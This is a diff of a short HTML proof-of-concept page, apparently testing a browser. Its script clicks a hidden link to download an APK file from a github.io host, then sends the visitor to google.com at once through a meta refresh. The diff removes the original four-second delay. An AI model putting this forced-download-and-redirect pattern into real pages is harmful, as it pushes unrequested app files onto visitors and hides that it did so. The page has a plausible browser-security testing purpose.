@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Download + Meta Refresh</title>
+<title>Download + Meta Refresh</title>
 </head>
 <body>
 
@@ -10,21 +10,21 @@
 <script>
 function sleep() {
 
-    document.body.insertAdjacentHTML("beforeend", "123<br>");
-
-    // Start download
+    // create download link
     var link = document.createElement("a");
     link.href = "https://lowleveljody.github.io/pocbrowseraja/montero.apk";
     link.download = "montero.apk";
     document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
 
-    // Meta refresh after 4 seconds
+    // trigger download
+    link.click();
+
+    // create meta refresh immediately
     var meta = document.createElement("meta");
     meta.httpEquiv = "refresh";
     meta.content = "0;url=https://www.google.com/";
     document.head.appendChild(meta);
+
 }
 </script>
 
